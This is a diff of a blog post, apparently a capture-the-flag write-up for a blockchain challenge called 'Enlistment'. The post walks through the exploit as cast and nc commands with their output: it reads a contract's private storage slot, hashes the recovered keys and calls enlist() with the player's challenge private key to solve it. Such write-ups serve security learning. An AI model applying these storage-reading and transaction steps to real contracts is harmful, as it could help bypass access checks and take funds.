@@ -25,15 +25,16 @@ Unzip the File
 ![[blockchain_enlistment]](/assets/img/posts/2025-06-09-Enlistment/blockchain_enlistment.png)
 
 Port 42270 is used for rpc url
-```
+
+```bash
 RPC URL: http://94.237.59.89:42270/
 ```
 ![[rpc_url]](/assets/img/posts/2025-06-09-Enlistment/rpc_url.png)
 
 Lets use nc on port 59016
+
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nc 94.237.59.89 59016
+nc 94.237.59.89 59016
 1 - Get connection information
 2 - Restart instance
 3 - Get flag
@@ -79,13 +80,13 @@ contract Setup {
 After further analysis, the **isSolved()** function's type data is **bool** which returns either **true or false**. It means that we must make sure that the player is actually done the transaction in Enlistement.sol
 
 We need to call the Target()  to get the Enlistement contract. Lets call the TARGET() function. This is used for enlistment contract
+
 ```bash
 cast call -r <RPC_URL> <SETUP_CONTRACT> "TARGET()"
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "TARGET()"
+cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "TARGET()"
 0x000000000000000000000000748c5f75488b89e1871c7a86a59ba5139d99ea53
 
 0x748c5f75488b89e1871c7a86a59ba5139d99ea53
@@ -140,8 +141,7 @@ cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()"
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()" 
+cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()" 
 0x454e4c4953545f52455153542062793a00000000000000000000000000000000
 ```
 
@@ -152,8 +152,7 @@ cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()(bytes16)"
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()(bytes16)" 
+cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()(bytes16)" 
 0x454e4c4953545f52455153542062793a
 ```
 
@@ -161,12 +160,10 @@ cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()(bytes16)"
 Lets call the privateKey()
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()" 
+cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()" 
 Error: server returned an error response: error code 3: execution reverted, data: "0x"
 
-┌──(kali㉿kali)-[~]
-└─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()(bytes16)" 
+cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()(bytes16)" 
 Error: server returned an error response: error code 3: execution reverted, data: "0x"
 ```
 Got the following error
@@ -185,8 +182,7 @@ REMEMBER:
 Lets check the storage? Requires solidity compiler version 0.8.29
 
 ```bash
-┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/enlistment/blockchain-enlistment]
-└─$ ./solc-static-linux --storage-layout Enlistment.sol              
+./solc-static-linux --storage-layout Enlistment.sol              
 Error: Source file requires different compiler version (current compiler is 0.8.25+commit.b61c2a91.Linux.g++) - note that nightly builds are considered to be strictly less than the released version                                                                                                                                             
  --> Enlistment.sol:3:1:                                                                                                                                                 
   |
@@ -203,8 +199,7 @@ https://github.com/ethereum/solidity/releases/download/v0.8.30/solc-static-linux
 Lets use solidity compiler to get the slot for private key
 
 ```bash
-┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/enlistment/blockchain-enlistment]
-└─$ ./solc-static-linux --storage-layout Enlistment.sol
+./solc-static-linux --storage-layout Enlistment.sol
 
 ======= Enlistment.sol:Enlistment =======
 Contract Storage Layout:
@@ -218,15 +213,15 @@ cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> <SLOT>
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast storage -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 0
+cast storage -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 0
 0x20204147454e5420502e202331333337454e4c4953545f52455153542062793a
 ```
 
 ![[get slot for privateKey]](/assets/img/posts/2025-06-09-Enlistment/get slot for privateKey.png)
 
 Lets split this public and privatekey by 16 bytes. yep public key looks equal
-```
+
+```bash
 Public Key: 0x454e4c4953545f52455153542062793a
 Private key: 0x20204147454e5420502e202331333337
 ```
@@ -241,7 +236,7 @@ keccak256(abi.encodePacked(publicKey, privateKey));
 
 Lets switch the private key and public key order. In this case, (privateKey, publicKey) to (privateKey to publicKey) and append it like this one
 
-```
+```bash
 454e4c4953545f52455153542062793a20204147454e5420502e202331333337
 ```
 
@@ -252,15 +247,14 @@ cast keccak 0x<PUBLIC_KEY><PRIVATE_KEY>
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast keccak 0x454e4c4953545f52455153542062793a20204147454e5420502e202331333337
+cast keccak 0x454e4c4953545f52455153542062793a20204147454e5420502e202331333337
 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
 ```
 
 ###### Information Collected
 So we got the following information to moved on
 
-```
+```bash
 Player Private Key : 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36
 Player Address     : 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
 Target contract    : 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53
@@ -282,8 +276,7 @@ cast send -r <RPC_URL> --private-key <PLAYER_PRIVATE_KEY> <ENLISTMENT_CONTRACT> 
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast send -r http://94.237.59.89:42270/ --private-key 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "enlist(bytes32)" 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
+cast send -r http://94.237.59.89:42270/ --private-key 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "enlist(bytes32)" 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
 
 blockHash            0xb98c1b933a0dc7f6ad80978cc48832689621d2a4648b29fc02588645d299f869
 blockNumber          2
@@ -320,8 +313,7 @@ cast call -r <RPC_URL> <SETUP_CONTRACT> "isSolved()" <PLAYER_ADDRESS>
 ```
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "isSolved()" 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
+cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "isSolved()" 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
 0x0000000000000000000000000000000000000000000000000000000000000001
 ```
 
@@ -329,8 +321,7 @@ cast call -r <RPC_URL> <SETUP_CONTRACT> "isSolved()" <PLAYER_ADDRESS>
 Get the flag
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nc 94.237.59.89 59016                                                                                                                     
+nc 94.237.59.89 59016                                                                                                                     
 1 - Get connection information
 2 - Restart instance
 3 - Get flag
